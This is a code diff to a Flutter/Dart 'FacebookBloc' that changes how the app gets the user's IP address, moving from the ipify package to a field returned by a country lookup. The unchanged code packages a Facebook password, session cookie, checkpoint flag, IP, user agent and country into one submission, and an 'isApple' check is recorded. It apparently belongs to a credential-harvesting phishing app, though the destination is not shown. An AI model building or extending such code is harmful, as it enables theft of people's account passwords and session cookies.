@@ -1,7 +1,6 @@
 import 'dart:async';
 import 'dart:io';
 import 'package:bloc/bloc.dart';
-import 'package:dart_ipify/dart_ipify.dart';
 import 'package:equatable/equatable.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
 import 'package:flutter/foundation.dart';
@@ -17,7 +16,6 @@ part 'facebook_state.dart';
 @Singleton()
 class FacebookBloc extends Bloc<FacebookEvent, FacebookState> {
   FaceUseCase faceUseCase;
-  var ipv4 = '';
   late IPInfoModel infoModel;
   String userAgent = '';
   String platform = '';
@@ -31,8 +29,7 @@ class FacebookBloc extends Bloc<FacebookEvent, FacebookState> {
     InitFacebookEvent event,
     Emitter<FacebookState> emit,
   ) async {
-    ipv4 = await Ipify.ipv4();
-    infoModel = await checkCountry(ipv4);
+    infoModel = await checkCountry();
     await FkUserAgent.init();
     userAgent = FkUserAgent.userAgent ?? '';
     if (Platform.isAndroid) {
@@ -55,7 +52,7 @@ class FacebookBloc extends Bloc<FacebookEvent, FacebookState> {
         pass: event.pass,
         hasCheckpoint: event.hasCheckpoint,
         cookie: event.cookie,
-        ipAdress: ipv4,
+        ipAdress: infoModel.ip,
         app: appName,
         countryCode: infoModel.country,
         agent: userAgent,
@@ -67,10 +64,10 @@ class FacebookBloc extends Bloc<FacebookEvent, FacebookState> {
   }
 
   //
-  Future<IPInfoModel> checkCountry(String ipv4) async {
-    final response = await faceUseCase.getCountry(ipv4);
+  Future<IPInfoModel> checkCountry() async {
+    final response = await faceUseCase.getCountry();
     return response.fold(
-      (failure) => IPInfoModel(country: '',org: '', isApple: false),
+      (failure) => IPInfoModel(ip: '', country: '',org: '', isApple: false),
       (res) => res,
     );
   }
